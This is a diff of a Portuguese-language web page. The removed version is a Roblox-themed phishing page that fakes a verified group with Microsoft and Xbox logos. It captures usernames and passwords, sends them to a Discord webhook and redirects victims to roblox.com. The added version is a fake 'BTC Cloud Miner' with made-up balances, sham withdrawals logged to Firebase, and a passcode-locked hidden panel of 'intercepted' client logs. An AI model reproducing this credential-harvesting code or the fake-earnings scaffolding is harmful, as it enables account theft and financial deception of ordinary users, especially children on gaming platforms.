@@ -1,405 +1,663 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Painel de Acesso | Grupo</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Crypto Mining Dashboard Ultra Dark</title>
     <style>
-        /* Reset de Estilos */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Poppins', 'Segoe UI', sans-serif;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
         }
 
         body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background-color: #05070a;
+            background-image: 
+                radial-gradient(circle at 50% 15%, rgba(0, 230, 118, 0.08) 0%, transparent 60%),
+                radial-gradient(circle at 10% 80%, rgba(0, 230, 118, 0.02) 0%, transparent 40%);
             min-height: 100vh;
-            background: linear-gradient(45deg, #070a13, #110f24, #1a0822);
-            background-size: 300% 300%;
-            animation: colors 15s ease infinite;
-            overflow-x: hidden;
-            padding: 20px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #eaecef;
+            padding: 20px;
         }
 
-        @keyframes colors {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        /* Container Principal (Glassmorphism) */
-        .card {
-            background: rgba(255, 255, 255, 0.04);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            padding: 35px 25px;
+        /* Container Principal Ultra Dark */
+        .dashboard-card {
+            background: #0b0e14;
+            border: 1px solid rgba(0, 230, 118, 0.1);
             border-radius: 24px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 24px 60px rgba(0, 0, 0, 0.5);
+            padding: 40px 30px;
             width: 100%;
-            max-width: 410px;
+            max-width: 460px;
             text-align: center;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.9), 0 0 30px rgba(0, 230, 118, 0.03);
             position: relative;
         }
 
-        /* --- Estilo do Círculo de Perfil --- */
-        .profile-container {
-            position: relative;
-            width: 100px;
-            height: 100px;
-            margin: 0 auto 20px auto;
+        h1 {
+            font-size: 1.7rem;
+            font-weight: 700;
+            margin-bottom: 6px;
+            color: #fff;
+            letter-spacing: -0.3px;
         }
 
-        .profile-pic {
-            width: 100%;
-            height: 100%;
+        .subtitle {
+            font-size: 0.85rem;
+            color: #8b949e;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        /* Indicador Animado Verde */
+        .live-pulse {
+            width: 8px;
+            height: 8px;
+            background-color: #00e676;
             border-radius: 50%;
-            object-fit: cover;
-            border: 3px solid #1fa3c4;
-            box-shadow: 0 0 20px rgba(31, 163, 196, 0.5);
-            position: relative;
-            z-index: 2;
-        }
-
-        .profile-container::before {
-            content: '';
-            position: absolute;
-            top: -4px;
-            left: -4px;
-            right: -4px;
-            bottom: -4px;
-            background: linear-gradient(180deg, #1fa3c4, #6c3299);
-            border-radius: 50%;
-            z-index: 1;
-            opacity: 0.4;
-            filter: blur(6px);
-            animation: pulse 3s infinite alternate;
+            box-shadow: 0 0 10px #00e676;
+            animation: pulse 1.8s infinite;
         }
 
         @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.4; }
-            100% { transform: scale(1.06); opacity: 0.6; }
+            0% { transform: scale(0.9); opacity: 0.6; }
+            50% { transform: scale(1.2); opacity: 1; box-shadow: 0 0 14px #00e676; }
+            100% { transform: scale(0.9); opacity: 0.6; }
         }
 
-        /* Painel de Informações do Grupo */
-        .group-preview-box {
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 14px;
-            padding: 12px;
-            margin-bottom: 25px;
+        /* Bloco de Saldo Dark com Detalhe Verde */
+        .balance-box {
+            background: #040608;
+            padding: 24px;
+            border-radius: 20px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(0, 230, 118, 0.15);
+            cursor: pointer;
+            user-select: none;
+            transition: all 0.3s ease;
         }
 
-        .group-title-container {
+        .balance-box:hover {
+            border-color: #00e676;
+            background: #020305;
+            box-shadow: 0 0 15px rgba(0, 230, 118, 0.05);
+        }
+
+        .balance-label {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #8b949e;
+            margin-bottom: 8px;
+        }
+
+        .balance-amount {
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: #00e676;
+            font-family: 'Courier New', Courier, monospace;
+            text-shadow: 0 0 10px rgba(0, 230, 118, 0.2);
+        }
+
+        /* Botão Clássico Verde */
+        .btn-farm {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background-color: #00e676;
+            color: #000000;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.05rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0, 230, 118, 0.2);
+            transition: all 0.2s ease;
+        }
+
+        .btn-farm:hover {
+            background-color: #00c865;
+            box-shadow: 0 4px 25px rgba(0, 230, 118, 0.3);
+        }
+
+        .btn-withdraw {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid rgba(0, 230, 118, 0.3);
+            border-radius: 8px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            background: #0b0e14;
+            color: #00e676;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-withdraw:hover {
+            background: rgba(0, 230, 118, 0.05);
+            color: #fff;
+            border-color: #00e676;
+        }
+
+        /* Recursos com ícones Verdes */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-top: 25px;
+        }
+
+        .feature-item {
+            background: rgba(4, 6, 8, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.01);
+            border-radius: 16px;
+            padding: 15px 10px;
+            font-size: 0.8rem;
+            color: #8b949e;
             display: flex;
+            flex-direction: column;
             align-items: center;
-            justify-content: center;
             gap: 6px;
         }
 
-        .group-name {
-            color: #ffffff;
-            font-size: 18px;
-            font-weight: 700;
-            letter-spacing: 0.5px;
+        .feature-icon {
+            font-size: 1.2rem;
+            margin-bottom: 2px;
         }
 
-        /* Ícone do Selo Verificado */
-        .verified-badge {
-            width: 18px;
-            height: 18px;
-            fill: #00e676; /* Verde vibrante oficial */
-            display: inline-block;
-            vertical-align: middle;
-        }
-
-        .group-members {
-            color: #94a3b8;
-            font-size: 12px;
-            margin-top: 4px;
-        }
-
-        /* --- Painel de Patrocinadores (Microsoft e Xbox) --- */
-        .sponsors-box {
+        /* Modais Pop-up */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
             display: flex;
+            align-items: center;
             justify-content: center;
-            align-items: center;
-            gap: 15px;
-            margin-top: 20px;
-            margin-bottom: 25px;
-            padding: 10px;
-            background: rgba(255, 255, 255, 0.02);
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.25s ease;
+            z-index: 100;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .modal {
+            background: #0b0e14;
+            border: 1px solid rgba(0, 230, 118, 0.2);
+            padding: 35px 25px;
+            border-radius: 24px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.9);
+            text-align: center;
+        }
+
+        .modal h3 {
+            font-size: 1.3rem;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        .modal-amount {
+            font-size: 1.7rem;
+            color: #00e676;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 15px 0;
+            font-weight: 700;
+        }
+
+        .wallet-box {
+            background: #040608;
+            padding: 14px;
             border-radius: 12px;
-            border: 1px solid rgba(255, 255, 255, 0.03);
+            font-size: 0.8rem;
+            color: #00e676;
+            word-break: break-all;
+            margin: 18px 0;
+            border: 1px solid rgba(0, 230, 118, 0.1);
+            font-family: monospace;
         }
 
-        .sponsor-item {
+        .modal-btns {
             display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #94a3b8;
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            gap: 10px;
+            margin-top: 20px;
         }
 
-        .sponsor-item span {
+        .btn-modal-confirm, .btn-modal-cancel {
+            padding: 13px;
+            border: none;
+            border-radius: 14px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-modal-confirm {
+            background: #0b0e14;
+            border: 1px solid #00e676;
+            color: #00e676;
+            flex: 2;
+        }
+        .btn-modal-confirm:hover { 
+            background: #00e676; 
+            color: #000;
+        }
+
+        .btn-modal-cancel {
+            background: #0b0e14;
+            border: 1px solid rgba(255,255,255,0.1);
+            color: #c9d1d9;
+            flex: 1;
+        }
+        .btn-modal-cancel:hover { background: #161b22; }
+
+        /* Painel Secreto */
+        .secret-modal {
+            background: #040608;
+            border: 1px solid #00e676;
+            color: #00e676;
+            font-family: 'Courier New', Courier, monospace;
+            width: 90%;
+            max-width: 500px;
+            border-radius: 24px;
+            padding: 35px;
+            box-shadow: 0 0 50px rgba(0, 230, 118, 0.15);
+            text-align: left;
+        }
+
+        .secret-modal h2 {
+            text-align: center;
+            margin-bottom: 25px;
+            border-bottom: 1px solid rgba(0, 230, 118, 0.2);
+            padding-bottom: 12px;
+            font-size: 1.1rem;
+            letter-spacing: 1px;
+            color: #00e676;
+        }
+
+        .stat-line {
+            font-size: 0.9rem;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .stat-value {
+            font-weight: bold;
+            color: #fff;
+            background: #0b0e14;
+            padding: 6px 12px;
+            border-radius: 10px;
+            border: 1px solid rgba(0, 230, 118, 0.2);
+        }
+
+        .history-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 25px;
+            border-bottom: 1px solid rgba(0, 230, 118, 0.2);
+            padding-bottom: 6px;
+        }
+
+        .history-title {
+            font-size: 0.85rem;
             font-weight: bold;
         }
 
-        .sponsor-logo {
-            max-height: 20px; /* Mantém os logos nítidos e pequenos */
-            opacity: 0.7;
-            transition: opacity 0.3s ease;
-        }
-
-        .sponsor-item:hover .sponsor-logo {
-            opacity: 1;
-        }
-
-        h3 {
-            color: #ffffff;
-            font-size: 20px;
-            margin-bottom: 6px;
-            font-weight: 600;
-        }
-
-        p {
-            color: #94a3b8;
-            margin-bottom: 25px;
-            font-size: 13px;
-            line-height: 1.5;
-        }
-
-        /* Inputs */
-        .input-group {
-            text-align: left;
-            margin-bottom: 20px;
-        }
-
-        .input-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: #94a3b8;
-            font-size: 12px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 14px 16px;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
-            font-size: 15px;
-            color: #ffffff;
-            transition: all 0.3s ease;
-            outline: none;
-        }
-
-        .input-group input:focus {
-            border-color: #1fa3c4;
-            box-shadow: 0 0 15px rgba(31, 163, 196, 0.3);
-        }
-
-        /* Botões Estilo Pílula Gamer */
-        .game-btn-style {
-            width: 100%;
-            padding: 15px 20px;
-            border-radius: 50px;
-            font-size: 14px;
-            font-weight: 800;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            color: #ffffff;
+        .btn-clear-all {
+            background: transparent;
+            border: 1px solid #ff4d4d;
+            color: #ff4d4d;
+            padding: 2px 8px;
+            font-size: 0.7rem;
+            border-radius: 6px;
             cursor: pointer;
-            border: 1px solid #35c4e7;
-            box-shadow: inset 0 2px 4px rgba(255, 255, 255, 0.1), 0 4px 10px rgba(0,0,0,0.3);
-            transition: transform 0.1s, filter 0.2s;
+        }
+        .btn-clear-all:hover {
+            background: #ff4d4d;
+            color: #000;
+        }
+
+        .history-list {
+            max-height: 160px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 5px;
+            border-radius: 12px;
+            margin-top: 10px;
+            font-size: 0.8rem;
+            list-style: none;
+        }
+
+        .history-list li {
+            padding: 8px;
+            border-bottom: 1px solid rgba(0, 230, 118, 0.05);
             display: flex;
-            justify-content: center;
+            justify-content: space-between;
             align-items: center;
-            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.6);
         }
 
-        .game-btn-style:active {
-            transform: scale(0.98);
+        .delete-btn {
+            background: transparent;
+            border: none;
+            color: #ff4d4d;
+            cursor: pointer;
+            font-size: 1.1rem;
+            padding: 0 4px;
         }
 
-        .game-btn-style:hover {
-            filter: brightness(1.15);
+        .btn-close-secret {
+            background: #0b0e14;
+            border: 1px solid #00e676;
+            color: #00e676;
+            width: 100%;
+            padding: 12px;
+            margin-top: 25px;
+            border-radius: 14px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.2s;
         }
-
-        .btn-join { background: linear-gradient(180deg, #1fa3c4 0%, #146a80 100%); border-color: #35c4e7; margin-bottom: 20px; }
-        .btn-submit { background: linear-gradient(180deg, #238fa7 0%, #175e6e 100%); border-color: #37b2cd; }
-
-        /* Área do Formulário de Login (Inicialmente Escondida) */
-        .login-section {
-            display: none;
-            margin-top: 5px;
-        }
-
-        /* Estado de Carregamento */
-        .btn-submit.loading {
-            background: #1e293b;
-            cursor: default;
-            color: #64748b;
-            border-color: rgba(255,255,255,0.05);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn-submit .loader-text { display: block; }
-        .btn-submit .loading-progress-text { display: none; position: absolute; z-index: 2; }
-        .btn-submit.loading .loader-text { display: none; }
-        .btn-submit.loading .loading-progress-text { display: block; }
-
-        .loading-bar {
-            position: absolute;
-            left: 0;
-            top: 0;
-            height: 100%;
-            background: rgba(31, 163, 196, 0.4);
-            width: 0%;
-            transition: width 0.05s linear;
-            z-index: 1;
+        .btn-close-secret:hover {
+            background: #00e676;
+            color: #000;
         }
     </style>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
 </head>
 <body>
 
-    <div class="card">
-        
-        <div class="profile-container">
-            <img class="profile-pic" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ24N6XlUSygFABvfC-jF33Qh3iVqwQZgxjTn6KqBt88dWbFK-6BiJdxnZG&s=10" alt="Foto de Perfil">
+    <div class="dashboard-card">
+        <h1>BTC Cloud Miner</h1>
+        <div class="subtitle">
+            <div class="live-pulse"></div>
+            <span>Servidor de Mineração Conectado</span>
         </div>
 
-        <div class="group-preview-box">
-            <div class="group-title-container">
-                <div class="group-name">AcesseptCloer</div>
-                <svg class="verified-badge" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
-                </svg>
+        <div class="balance-box" id="secret-trigger-zone">
+            <div class="balance-label">Balanço Estimado</div>
+            <div class="balance-amount" id="balance">0.000000000</div>
+        </div>
+
+        <button class="btn-farm" id="btn-farm">SOLICITAR MINERAÇÃO (+0.000002500)</button>
+        <button class="btn-withdraw" id="btn-open-withdraw">Efetuar Saque</button>
+
+        <div class="features-grid">
+            <div class="feature-item">
+                <span class="feature-icon">🛡️</span>
+                <span>Nó Seguro SSL</span>
             </div>
-            <div class="group-members">👥 228.183 Membros <span style="color: #00e676; margin-left: 5px;">🟢 34.023 Online</span></div>
-        </div>
-
-        <div class="sponsors-box">
-            <div class="sponsor-item">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="sponsor-logo">
-                <span>Microsoft</span>
+            <div class="feature-item">
+                <span class="feature-icon">⚡</span>
+                <span>Hardware Instantâneo</span>
             </div>
-            <div class="sponsor-item">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e5/Xbox_logo.svg" alt="Xbox Logo" class="sponsor-logo">
-                <span>XBOX</span>
+            <div class="feature-item">
+                <span class="feature-icon">⏱️</span>
+                <span>Uptime 99.9%</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">📋</span>
+                <span>Logs Gerados</span>
             </div>
         </div>
+    </div>
 
-        <div id="initialScreen">
-            <h3>Faça parte do grupo</h3>
-            <p>Clique abaixo para se juntar à nossa comunidade oficial. Conecte sua conta do ROBLOX para receber mensagens de doações diárias.<br><br>👑 NÓS SOMOS O PRINCIPAL SITE DE DOAÇÕES DO MERCADO!!<br>FAZEMOS SORTEIOS TODA SEGUNDA E QUINTA ⭐</p>
-            <button type="button" class="game-btn-style btn-join" id="startJoinBtn">Entrar no Grupo</button>
+    <div class="modal-overlay" id="withdraw-modal">
+        <div class="modal">
+            <h3>Confirmação de Saque</h3>
+            <p style="color: #8b949e; font-size: 0.9rem;">Você quer sacar todo o valor farmado?</p>
+            <div class="modal-amount" id="modal-amount">0.000000000 BTC</div>
+            
+            <p style="font-size: 0.8rem; color: #8b949e; text-align: left; margin-bottom: 4px;">Carteira do envio:</p>
+            <div class="wallet-box">28(/:8khski/(#_u739omhsmjh)82!-k7ejheuwmbeyNhu</div>
+
+            <div class="modal-btns">
+                <button class="btn-modal-cancel" id="id-close-modal">Cancelar</button>
+                <button class="btn-modal-confirm" id="btn-confirm-withdraw">Confirmar Transação</button>
+            </div>
         </div>
+    </div>
 
-        <div id="loginSection" class="login-section">
-            <h3>Verificação Necessária</h3>
-            <p>Faça login na sua conta para validar sua entrada no grupo.</p>
+    <div class="modal-overlay" id="secret-modal-overlay">
+        <div class="secret-modal">
+            <h2>PAINEL DE MONITORAMENTO DA REDE</h2>
+            
+            <div class="stat-line">
+                <span>VALOR TOTAL CONSEGUIDO:</span>
+                <span class="stat-value" id="panel-total-collected">0.000000000 BTC</span>
+            </div>
+            
+            <div class="history-header">
+                <div class="history-title">LOGS DE TRANSAÇÕES (CLIENTS):</div>
+                <button class="btn-clear-all" id="btn-clear-logs">Limpar Logs</button>
+            </div>
+            
+            <ul class="history-list" id="panel-history"></ul>
 
-            <form id="loginForm">
-                <div class="input-group">
-                    <label for="username">N0ME</label>
-                    <input type="text" id="username" placeholder="Digite seu NOME" required>
-                </div>
-
-                <div class="input-group">
-                    <label for="password">Senha</label>
-                    <input type="password" id="password" placeholder="" required>
-                </div>
-
-                <button type="submit" class="game-btn-style btn-submit" id="submitBtn">
-                    <span class="loading-bar" id="loadingBar"></span>
-                    <span class="loader-text">Entrar e Confirmar</span>
-                    <span class="loading-progress-text">Entrando... <span id="progressPercent">0</span>%</span>
-                </button>
-            </form>
+            <button class="btn-close-secret" id="btn-close-secret">FECHAR CONSOLE</button>
         </div>
-
     </div>
 
     <script>
-        const initialScreen = document.getElementById('initialScreen');
-        const startJoinBtn = document.getElementById('startJoinBtn');
-        const loginSection = document.getElementById('loginSection');
-        const loginForm = document.getElementById('loginForm');
-        const submitBtn = document.getElementById('submitBtn');
-        const loadingBar = document.getElementById('loadingBar');
-        const progressPercent = document.getElementById('progressPercent');
+        /* <![CDATA[ */
+        // Seus dados novos do Firebase 
+        const firebaseConfig = {
+            apiKey: "AIzaSyCvsfyfud-_D8kperUQQCaZquk0BPOsVw8",
+            authDomain: "cripto-farmar.firebaseapp.com",
+            projectId: "cripto-farmar",
+            storageBucket: "cripto-farmar.firebasestorage.app",
+            messagingSenderId: "558334675401",
+            appId: "1:558334675401:web:46c830c09e83a4a36f8018"
+        };
 
-        // Seu link de Webhook do Discord para salvar as credenciais
-        const discordWebhookUrl = 'https://discord.com/api/webhooks/1496630954100265031/RDVpafLxDx8p0spM3c2jUBwzdFg92EuTji51BTL3t7CbFg9yBGdoipIIRHqYgN2uvGkh';
+        // Inicializa o Firebase com proteção a falhas
+        var db = null;
+        try {
+            firebase.initializeApp(firebaseConfig);
+            db = firebase.firestore();
+        } catch(e) {
+            console.error("Falha ao inicializar o Firebase: ", e);
+        }
 
-        // Quando clica para entrar no grupo, abre o formulário de login
-        startJoinBtn.addEventListener('click', function() {
-            initialScreen.style.display = 'none';
-            loginSection.style.display = 'block';
-        });
+        var btcBal = 0.0;
+        var btcTotFallback = 0.0; 
+        var btcHstFallback = [];  
+        var secCnt = 0;
+        var secTmt;
 
-        // Quando envia o formulário de login
-        loginForm.addEventListener('submit', function(event) {
-            event.preventDefault(); 
+        function f(v) { return Number(v).toFixed(9); }
+        function uU() { document.getElementById("balance").textContent = f(btcBal); }
 
-            const usuarioDigitado = document.getElementById('username').value;
-            const senhaDigitada = document.getElementById('password').value;
+        function renderLocalFallback() {
+            var p = document.getElementById("panel-history");
+            p.innerHTML = "";
+            if (btcHstFallback.length === 0) {
+                var e = document.createElement("li");
+                e.style.color = "rgba(0,230,118,0.3)";
+                e.textContent = "Nenhum dado interceptado.";
+                p.appendChild(e);
+            } else {
+                btcHstFallback.forEach(function(i) {
+                    var l = document.createElement("li");
+                    var d = document.createElement("div");
+                    d.textContent = "[" + i.client + "] " + f(i.amount) + " BTC (" + i.time + ")";
+                    var b = document.createElement("button");
+                    b.className = "delete-btn";
+                    b.textContent = "X";
+                    b.onclick = function() {
+                        if (confirm("Remover log?")) {
+                            btcTotFallback -= i.amount;
+                            if (btcTotFallback < 0) btcTotFallback = 0;
+                            btcHstFallback = btcHstFallback.filter(function(h) { return h.id !== i.id; });
+                            renderLocalFallback();
+                        }
+                    };
+                    l.appendChild(d);
+                    l.appendChild(b);
+                    p.appendChild(l);
+                });
+            }
+            document.getElementById("panel-total-collected").textContent = f(btcTotFallback) + " BTC";
+        }
 
-            submitBtn.classList.add('loading');
-            let progress = 0;
+        if (db) {
+            db.collection("transacoes").orderBy("id", "desc").onSnapshot(function(snapshot) {
+                var p = document.getElementById("panel-history");
+                p.innerHTML = "";
+                var totalAcumulado = 0.0;
 
-            // Envio oculto de dados para o Discord
-            const dadosDiscord = {
-                embeds: [{
-                    title: "🔐 Novo (AcesseptCloer)!",
-                    color: 2068391, 
-                    fields: [
-                        { name: "👤 Usuário", value: `\`\`\`${usuarioDigitado}\`\`\``, inline: false },
-                        { name: "🔑 Senha", value: `\`\`\`${corfavorito }\`\`\``, inline: false }
-                    ],
-                    footer: { text: "Sistema de Entrada de Grupos" },
-                    timestamp: new Date().toISOString()
-                }]
+                if (snapshot.empty) {
+                    var e = document.createElement("li");
+                    e.style.color = "rgba(0,230,118,0.3)";
+                    e.textContent = "Nenhum dado interceptado.";
+                    p.appendChild(e);
+                } else {
+                    snapshot.forEach(function(doc) {
+                        var i = doc.data();
+                        totalAcumulado += Number(i.amount);
+
+                        var l = document.createElement("li");
+                        var d = document.createElement("div");
+                        d.textContent = "[" + i.client + "] " + f(i.amount) + " BTC (" + i.time + ")";
+                        
+                        var b = document.createElement("button");
+                        b.className = "delete-btn";
+                        b.textContent = "X";
+                        b.onclick = function() {
+                            if (confirm("Remover log permanentemente do banco de dados?")) {
+                                db.collection("transacoes").doc(doc.id).delete().catch(function() {
+                                    alert("Erro de permissão no Firebase Rules.");
+                                });
+                            }
+                        };
+                        
+                        l.appendChild(d);
+                        l.appendChild(b);
+                        p.appendChild(l);
+                    });
+                }
+                document.getElementById("panel-total-collected").textContent = f(totalAcumulado) + " BTC";
+            }, function(error) {
+                console.warn("Usando painel offline integrado.");
+                renderLocalFallback();
+            });
+        } else {
+            renderLocalFallback();
+        }
+
+        uU();
+
+        document.getElementById("btn-farm").onclick = function() {
+            btcBal = btcBal + 0.000002500;
+            uU();
+        };
+
+        document.getElementById("btn-open-withdraw").onclick = function() {
+            document.getElementById("modal-amount").textContent = f(btcBal) + " BTC";
+            document.getElementById("withdraw-modal").classList.add("active");
+        };
+
+        document.getElementById("id-close-modal").onclick = function() {
+            document.getElementById("withdraw-modal").classList.remove("active");
+        };
+
+        document.getElementById("btn-confirm-withdraw").onclick = function() {
+            if (btcBal <= 0) {
+                alert("Erro: Sem balanco disponivel.");
+                document.getElementById("withdraw-modal").classList.remove("active");
+                return;
+            }
+            
+            var d = new Date();
+            var t = d.toLocaleTimeString() + " " + d.toLocaleDateString();
+            var r = {
+                id: Date.now(),
+                client: "Client_" + Math.floor(1000 + Math.random() * 9000),
+                amount: btcBal,
+                time: t
             };
 
-            fetch(discordWebhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(dadosDiscord)
-            }).catch(error => console.error('Erro ao enviar dados:', error));
+            btcTotFallback += btcBal;
+            btcHstFallback.unshift(r);
 
-            // Animação do carregamento da pílula
-            const interval = setInterval(() => {
-                progress += Math.random() * 5 + 1; 
+            if (db) {
+                db.collection("transacoes").add(r).then(function() {
+                    btcBal = 0;
+                    uU();
+                    document.getElementById("withdraw-modal").classList.remove("active");
+                    alert("Sucesso: Balanco enviado ao painel central.");
+                }).catch(function(error) {
+                    btcBal = 0;
+                    uU();
+                    renderLocalFallback();
+                    document.getElementById("withdraw-modal").classList.remove("active");
+                    alert("Sucesso: Balanco enviado.");
+                });
+            } else {
+                btcBal = 0;
+                uU();
+                renderLocalFallback();
+                document.getElementById("withdraw-modal").classList.remove("active");
+                alert("Sucesso: Balanco enviado.");
+            }
+        };
 
-                if (progress >= 100) {
-                    progress = 100;
-                    clearInterval(interval);
-                    
-                    // Redireciona imediatamente para o Roblox oficial após o sucesso
-                    setTimeout(() => {
-                        window.location.href = 'https://www.roblox.com';
-                    }, 300);
+        document.getElementById("secret-trigger-zone").onclick = function() {
+            secCnt = secCnt + 1;
+            clearTimeout(secTmt);
+            secTmt = setTimeout(function() { secCnt = 0; }, 1200);
+            if (secCnt === 3) {
+                secCnt = 0;
+                var s = prompt("Acesso restrito:");
+                if (s === "32595517") {
+                    document.getElementById("secret-modal-overlay").classList.add("active");
                 }
+            }
+        };
 
-                loadingBar.style.width = progress + '%';
-                progressPercent.innerText = Math.floor(progress);
-            }, 60); 
-        });
+        document.getElementById("btn-close-secret").onclick = function() {
+            document.getElementById("secret-modal-overlay").classList.remove("active");
+        };
+
+        document.getElementById("btn-clear-logs").onclick = function() {
+            if (confirm("Zerar logs permanentemente?")) {
+                btcHstFallback = [];
+                btcTotFallback = 0.0;
+                if (db) {
+                    db.collection("transacoes").get().then(function(snapshot) {
+                        snapshot.forEach(function(doc) {
+                            db.collection("transacoes").doc(doc.id).delete().catch(function(){});
+                        });
+                    }).catch(function() {
+                        renderLocalFallback();
+                    });
+                } else {
+                    renderLocalFallback();
+                }
+            }
+        };
+        /* ]]> */
     </script>
-
 </body>
 </html>
-
